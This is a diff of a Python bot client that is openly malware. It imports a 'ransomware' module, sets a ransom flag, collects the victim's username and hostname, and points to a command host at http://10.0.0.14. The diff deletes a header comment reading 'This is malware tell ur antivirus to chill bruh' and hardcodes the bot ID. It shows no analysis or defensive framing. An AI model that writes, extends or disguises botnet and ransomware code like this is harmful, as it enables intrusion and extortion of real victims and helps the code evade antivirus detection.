@@ -1,6 +1,5 @@
-#######
-# This is malware tell ur antivirus to chill bruh
-#######
+
+
 from datetime import datetime
 import time
 import uuid
@@ -12,13 +11,16 @@ import os
 from subprocess import check_output
 import ctypes
 import ransomware
+from requests_toolbelt.utils import dump
+
+
 
 HOME = 'http://10.0.0.14'
 
 class Bot(object):
     def __init__(self):
         self.platform = platform.system()
-        self.uid = uuid.uuid1()
+        self.uid = str(12341)
         self.username = self.curr_user()
         self.hostname = socket.gethostname()
         self.ransom = False
